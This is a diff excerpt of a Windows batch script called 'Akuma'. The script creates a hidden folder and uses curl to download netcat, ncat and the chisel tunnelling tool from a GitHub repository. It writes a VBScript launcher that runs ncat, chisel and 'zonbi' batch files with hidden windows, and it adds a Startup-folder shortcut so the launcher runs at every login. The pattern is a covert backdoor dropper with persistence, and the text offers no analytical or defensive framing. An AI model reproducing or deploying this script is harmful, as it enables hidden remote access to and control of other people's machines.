@@ -7,7 +7,6 @@ attrib +h %homedrive%\Akuma
 cd %homedrive%\Akuma
 mkdir %homedrive%\Akuma\ncat-portable-5.59BETA1
 mkdir %homedrive%\Akuma\nc 
-curl -L https://github.com/l-urk/Akuma/raw/main/ncat.exe > %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/nc.exe > %homedrive%\Akuma\nc\nc
 curl -L https://github.com/l-urk/Akuma/raw/main/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
 curl -L https://github.com/l-urk/Akuma/raw/main/chisel.exe > chisel.exe
@@ -25,7 +24,6 @@ echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\ncat.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\chisel.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
-tar -xf ncat-portable-5.59BETA1.zip
 echo y| del "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
 start %homedrive%\Akuma\Akuma.vbs
